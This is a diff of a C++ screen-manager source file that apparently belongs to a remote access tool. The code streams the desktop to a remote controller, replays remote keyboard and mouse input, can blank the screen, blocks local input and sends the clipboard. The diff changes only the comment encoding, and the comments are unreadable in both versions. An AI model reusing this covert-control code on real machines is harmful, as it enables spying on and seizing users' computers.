@@ -1,4 +1,4 @@
-ï»¿// ScreenManager.cpp: implementation of the CScreenManager class.
+// ScreenManager.cpp: implementation of the CScreenManager class.
 //
 //////////////////////////////////////////////////////////////////////
 //#define _WIN32_WINNT	0x0400
@@ -14,8 +14,8 @@
 
 CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
 {
-	m_bAlgorithm = ALGORITHM_HOME;  // é»˜è®¤ä½¿ç”¨å®¶ç”¨åŠå…¬ç®—æ³•
-	m_biBitCount = 32;              // 3 = 4ä½ç°åº¦, 7 = 8ä½ç°åº¦
+	m_bAlgorithm = ALGORITHM_HOME;  // Ä¬ÈÏÊ¹ÓÃ¼ÒÓÃ°ì¹«Ëã·¨
+	m_biBitCount = 32;              // 3 = 4Î»»Ò¶È, 7 = 8Î»»Ò¶È
 	m_pScreenSpy = new CScreenSpy(32, false);
 	m_bIsWorking = true;
 	m_bIsBlankScreen = false;
@@ -39,7 +39,7 @@ CScreenManager::~CScreenManager()
 	CloseHandle(m_hCtrlThread);
 	ReleaseDC(NULL, m_hDeskTopDC);
 	SetAeroComposition(m_bIsComposition);
-	BlockInput(FALSE); // æ¢å¤é”®ç›˜å’Œé¼ æ ‡
+	BlockInput(FALSE); // »Ö¸´¼üÅÌºÍÊó±ê
 	
 	if (m_pScreenSpy)
 		delete m_pScreenSpy;
@@ -55,9 +55,9 @@ void CScreenManager::ResetScreen(int biBitCount)
 	delete m_pScreenSpy;
 	m_pScreenSpy = NULL;
 	
-	if (biBitCount == 3)		// 4ä½ç°åº¦
+	if (biBitCount == 3)		// 4Î»»Ò¶È
 		m_pScreenSpy = new CScreenSpy(4, true);
-	else if (biBitCount == 7)	// 8ä½ç°åº¦
+	else if (biBitCount == 7)	// 8Î»»Ò¶È
 		m_pScreenSpy = new CScreenSpy(8, true);
 	else
 		m_pScreenSpy = new CScreenSpy(biBitCount);
@@ -114,7 +114,7 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
  	switch (lpBuffer[0])
  	{
 	case COMMAND_NEXT:
-		// é€šçŸ¥å†…æ ¸è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²æ‰“å¼€ï¼ŒWaitForDialogOpenå¯ä»¥è¿”å›
+		// Í¨ÖªÄÚºËÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ´ò¿ª£¬WaitForDialogOpen¿ÉÒÔ·µ»Ø
 		NotifyDialogIsOpen();
 		break;
 	case COMMAND_AERO_DISABLE:
@@ -135,12 +135,12 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 	case COMMAND_SCREEN_CONTROL:
 		if (m_bIsBlockInput)
-			BlockInput(FALSE);       // è¿œç¨‹ä»ç„¶å¯ä»¥æ“ä½œ
+			BlockInput(FALSE);       // Ô¶³ÌÈÔÈ»¿ÉÒÔ²Ù×÷
 		ProcessCommand(lpBuffer + 1, nSize - 1);
 		if (m_bIsBlockInput)
 			BlockInput(m_bIsBlockInput);
 		break;
-	case COMMAND_SCREEN_BLOCK_INPUT: // CtrlThreadé‡Œé”å®š
+	case COMMAND_SCREEN_BLOCK_INPUT: // CtrlThreadÀïËø¶¨
 		InterlockedExchange((LPLONG)&m_bIsBlockInput, *(LPBYTE)&lpBuffer[1]);
 		BlockInput(m_bIsBlockInput);
 		break;
@@ -217,12 +217,12 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 	CScreenManager *pThis = (CScreenManager *)lparam;
 	
 	pThis->sendBitmapInfo();
-	// ç­‰æ§åˆ¶ç«¯å¯¹è¯æ¡†æ‰“å¼€
+	// µÈ¿ØÖÆ¶Ë¶Ô»°¿ò´ò¿ª
 	pThis->WaitForDialogOpen();
-	// å‘é€ç¬¬ä¸€å¼ å±å¹•å›¾ç‰‡
+	// ·¢ËÍµÚÒ»ÕÅÆÁÄ»Í¼Æ¬
 	pThis->sendFirstScreen();
 	
-	try // æ§åˆ¶ç«¯å¼ºåˆ¶å…³é—­æ—¶ä¼šå‡ºé”™
+	try // ¿ØÖÆ¶ËÇ¿ÖÆ¹Ø±ÕÊ±»á³ö´í
     {
 		while (pThis->m_bIsWorking)
 		{
@@ -234,7 +234,7 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 	return 0;
 }
 
-// åˆ›å»ºè¿™ä¸ªçº¿ç¨‹ä¸»è¦æ˜¯ä¸ºäº†ç›‘è§†åˆ†è¾¨ç‡å’Œä¿æŒä¸€ç›´é»‘å±
+// ´´½¨Õâ¸öÏß³ÌÖ÷ÒªÊÇÎªÁË¼àÊÓ·Ö±æÂÊºÍ±£³ÖÒ»Ö±ºÚÆÁ
 DWORD WINAPI CScreenManager::CtrlThread(LPVOID lparam)
 {
 	static bool bIsScreenBlanked = false;
@@ -243,7 +243,7 @@ DWORD WINAPI CScreenManager::CtrlThread(LPVOID lparam)
 	
 	while (pThis->IsConnect())
 	{
-		// åˆ†è¾¨ç‡å¤§å°æ”¹å˜äº†
+		// ·Ö±æÂÊ´óĞ¡¸Ä±äÁË
 		if (pThis->IsResolutionChange())
 		{
 			pThis->ResetScreen(pThis->GetCurrentPixelBits());
@@ -267,16 +267,16 @@ DWORD WINAPI CScreenManager::CtrlThread(LPVOID lparam)
 
 void CScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
 {
-	// æ•°æ®åŒ…ä¸åˆæ³•
+	// Êı¾İ°ü²»ºÏ·¨
 	if (nSize % sizeof(MSG) != 0)
 		return;
 	
 	::SwitchInputDesktop();
 	
-	// å‘½ä»¤ä¸ªæ•°
+	// ÃüÁî¸öÊı
 	int	nCount = nSize / sizeof(MSG);
 	
-	// å¤„ç†å¤šä¸ªå‘½ä»¤
+	// ´¦Àí¶à¸öÃüÁî
 	for (int i = 0; i < nCount; i++)
 	{
 		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
@@ -381,7 +381,7 @@ void CScreenManager::SendLocalClipboard()
 	delete[] lpData;
 }
 
-// å±å¹•åˆ†è¾¨ç‡æ˜¯å¦å‘ç”Ÿæ”¹å˜
+// ÆÁÄ»·Ö±æÂÊÊÇ·ñ·¢Éú¸Ä±ä
 bool CScreenManager::IsResolutionChange()
 {
 	if (!m_bIsWorking || m_pScreenSpy == NULL)
